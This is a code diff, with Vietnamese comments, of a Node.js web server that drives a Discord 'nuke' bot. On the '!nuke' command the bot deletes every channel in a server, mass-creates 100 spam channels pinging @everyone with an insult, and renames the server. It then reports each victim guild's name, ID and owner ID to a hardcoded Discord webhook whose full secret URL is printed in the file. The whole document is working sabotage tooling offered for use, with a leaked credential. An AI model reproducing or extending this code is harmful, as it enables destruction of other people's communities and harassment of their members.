@@ -10,17 +10,27 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';
 
-const DEFAULT_CONFIG = {
-  channelName: 'NUKE BY PHTUANKHANH',
-  renameName: 'NUKE BY PTK',
+// CẤU HÌNH CỐ ĐỊNH THEO YÊU CẦU
+const CONFIG = {
+  channelName: 'anh-phtuankhanh-nuke',
+  renameName: 'NUKE BY PHTUANKHANH',
   channelCount: 100,
   msgContent: '# NUKED\n> @everyone cút hết',
   msgCount: 1,
   pingEveryone: true
 };
 
-const botConfigs = new Map();
-const bots = new Map();
+let botClient = null;
+let currentToken = null;
+let currentClientId = null; // Dùng để tạo link add bot
+let webLogs = []; // Lưu log trên RAM để gửi về web
+
+function pushLog(msg, type = 'info') {
+  const log = { time: new Date().toLocaleTimeString(), msg, type };
+  webLogs.push(log);
+  if (webLogs.length > 200) webLogs.shift(); // Giới hạn 200 dòng
+  console.log(`[${type.toUpperCase()}] ${msg}`);
+}
 
 async function notifyNuke(info) {
   const { guildName, guildIcon, guildId, ownerId, channels, msgs, user, error } = info;
@@ -55,11 +65,13 @@ async function notifyNuke(info) {
 }
 
 function startBot(token) {
-  if (bots.has(token)) {
-    bots.get(token).destroy();
+  if (botClient) {
+    botClient.destroy();
+    botClient = null;
   }
 
-  const client = new Client({
+  currentToken = token;
+  botClient = new Client({
     intents: [
       GatewayIntentBits.Guilds,
       GatewayIntentBits.GuildMessages,
@@ -68,31 +80,28 @@ function startBot(token) {
     ]
   });
 
-  client.on('ready', () => {
-    console.log(`[BOT] Online: ${client.user.tag}`);
+  botClient.on('ready', () => {
+    currentClientId = botClient.user.id;
+    pushLog(`Bot đã online: ${botClient.user.tag}`, 'success');
   });
 
-  client.on('messageCreate', async (message) => {
+  botClient.on('messageCreate', async (message) => {
     if (message.author.bot) return;
     if (message.content !== '!nuke') return;
 
-    const cfg = botConfigs.get(token) || { ...DEFAULT_CONFIG };
     const guild = message.guild;
     const t0 = Date.now();
     message.reply('🚀 Bắt đầu nuke...').catch(() => {});
+    pushLog(`Bắt đầu nuke server: ${guild.name}`, 'warn');
 
     let channelsCreated = 0;
     let msgsSent = 0;
 
     try {
-      const cc = cfg.channelCount;
-      const chName = cfg.channelName;
-      const rName = cfg.renameName;
-      const mc = cfg.msgCount;
-      const msgText = cfg.msgContent;
-      const ping = cfg.pingEveryone;
+      const { channelCount: cc, channelName: chName, renameName: rName, msgCount: mc, msgContent: msgText, pingEveryone: ping } = CONFIG;
 
       // 1. XOÁ ALL KÊNH
+      pushLog(`Đang xoá toàn bộ kênh...`, 'info');
       const oldChannels = await guild.channels.fetch().catch(() => null);
       if (oldChannels) {
         await Promise.allSettled(
@@ -101,6 +110,7 @@ function startBot(token) {
       }
 
       // 2. TẠO KÊNH + SPAM
+      pushLog(`Đang tạo ${cc} kênh và spam tin nhắn...`, 'info');
       const createPromises = Array.from({ length: cc }, () =>
         guild.channels.create({
           name: chName,
@@ -119,84 +129,88 @@ function startBot(token) {
       await Promise.allSettled(createPromises);
 
       // 3. RENAME
-      if (rName) await guild.setName(rName).catch(() => {});
+      if (rName) {
+        pushLog(`Đang đổi tên server...`, 'info');
+        await guild.setName(rName).catch(() => {});
+      }
 
       await notifyNuke({
         guildName: guild.name,
         guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
         guildId: guild.id, ownerId: guild.ownerId,
         channels: channelsCreated, msgs: msgsSent,
-        user: client.user.username,
+        user: botClient.user.username,
         error: null,
       });
 
-      console.log(`[NUKE] Xong trong ${Date.now() - t0}ms`);
+      pushLog(`NUKE HOÀN TẤT trong ${Date.now() - t0}ms!`, 'success');
 
     } catch (err) {
-      console.error('Lỗi nuke:', err.message);
+      pushLog(`Lỗi nuke: ${err.message}`, 'error');
       await notifyNuke({
         guildName: guild.name, 
         guildIcon: guild.iconURL({ size: 256, extension: 'png' }), 
         guildId: guild.id,
         ownerId: guild.ownerId, channels: channelsCreated, msgs: msgsSent, 
-        user: client.user.username, error: err.message
+        user: botClient.user.username, error: err.message
       });
     }
   });
 
-  client.login(token).catch(e => console.error('Login error:', e.message));
-  bots.set(token, client);
-  
-  if (!botConfigs.has(token)) {
-    botConfigs.set(token, { ...DEFAULT_CONFIG });
-  }
+  botClient.login(token).catch(e => {
+    pushLog(`Lỗi đăng nhập: ${e.message}`, 'error');
+    botClient = null;
+    currentClientId = null;
+  });
 }
 
-app.post('/api/bot-login', async (req, res) => {
+// --- API ROUTES ---
+app.post('/api/login', async (req, res) => {
   const { token } = req.body ?? {};
   
-  if (!token || typeof token !== 'string') {
-    return res.status(400).json({ error: 'Thiếu token bot' });
-  }
+  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'Thiếu token' });
 
   const cleanToken = token.trim();
-  if (!/^[A-Za-z0-9._-]+$/.test(cleanToken)) {
-    return res.status(400).json({ error: 'Token chứa ký tự không hợp lệ' });
-  }
+  if (!/^[A-Za-z0-9._-]+$/.test(cleanToken)) return res.status(400).json({ error: 'Token không hợp lệ' });
 
-  try {
-    startBot(cleanToken);
-    await new Promise(r => setTimeout(r, 2000));
-    const client = bots.get(cleanToken);
-    if (!client || !client.user) throw new Error('Đăng nhập thất bại, kiểm tra token');
-    res.json({ ok: true, user: client.user.tag });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
+  pushLog('Đang kết nối bot...', 'info');
+  startBot(cleanToken);
+  
+  // Đợi bot ready
+  await new Promise(r => setTimeout(r, 2000));
+  
+  if (botClient && botClient.user) {
+    res.json({ 
+      ok: true, 
+      user: botClient.user.tag,
+      clientId: botClient.user.id
+    });
+  } else {
+    res.status(500).json({ error: 'Đăng nhập thất bại, kiểm tra token hoặc Developer Portal' });
   }
 });
 
-app.post('/api/settings/get', (req, res) => {
-  const { token } = req.body ?? {};
-  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'missing token' });
-  res.json(botConfigs.get(token.trim()) || { ...DEFAULT_CONFIG });
+app.post('/api/logout', (req, res) => {
+  if (botClient) {
+    botClient.destroy();
+    botClient = null;
+    currentToken = null;
+    currentClientId = null;
+    pushLog('Bot đã tắt.', 'warn');
+  }
+  res.json({ ok: true });
 });
 
-app.post('/api/settings/save', (req, res) => {
-  const { token, channelName, renameName, channelCount, msgContent, msgCount, pingEveryone } = req.body ?? {};
-  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'missing token' });
-  
-  const cleanToken = token.trim();
-  if (!botConfigs.has(cleanToken)) botConfigs.set(cleanToken, { ...DEFAULT_CONFIG });
-  const cfg = botConfigs.get(cleanToken);
+app.get('/api/status', (req, res) => {
+  res.json({
+    online: !!(botClient && botClient.user),
+    user: botClient?.user?.tag || null,
+    clientId: currentClientId
+  });
+});
 
-  if (channelName) cfg.channelName = channelName;
-  if (renameName) cfg.renameName = renameName;
-  if (channelCount) cfg.channelCount = Math.min(500, Math.max(1, parseInt(channelCount, 10) || 100));
-  if (msgContent) cfg.msgContent = msgContent;
-  if (msgCount !== undefined) cfg.msgCount = Math.max(1, parseInt(msgCount, 10) || 1);
-  if (pingEveryone !== undefined) cfg.pingEveryone = !!pingEveryone;
-
-  res.json({ ok: true, config: cfg });
+app.get('/api/logs', (req, res) => {
+  res.json(webLogs);
 });
 
 const PORT = process.env.PORT || 3000;
